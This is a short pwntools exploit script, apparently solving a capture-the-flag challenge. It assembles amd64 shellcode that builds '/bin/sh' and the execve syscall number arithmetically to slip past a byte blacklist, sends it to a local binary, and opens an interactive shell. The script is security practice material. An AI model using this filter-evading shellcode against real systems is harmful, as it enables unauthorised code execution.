import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'execute'

context.arch = 'amd64'

shellcode = asm('''\
mov eax, 0x0065722f
add eax, 0x00030100
shl rax, 32

or rax,  0x6d65602f
add rax, 0x01040200
push rax

mov rdi, rsp
mov esi, 0x0
mov edx, 0x0

mov eax, 0x3c
sub eax, 0x01

syscall
''')

blacklist = set(b'\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67')

if not blacklist.isdisjoint(set(shellcode)):
    error(f'Payload contains blacklisted characters:\n'
          f'Payload: {" ".join(list(map(hex, shellcode)))}\n'
          f'Illegal Bytes: {list(map(hex, blacklist.intersection(set(shellcode))))}\n')
elif len(shellcode) > 60:
    error(f'Payload must contain 60 or fewer characters:\n'
          f'Payload is {len(shellcode)}')


# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start(exe=str(exe), gdb_script=gdb_script)

io.sendlineafter(b"Hey, just because I am hungry doesn't mean I'll execute everything\n", shellcode)

io.interactive()
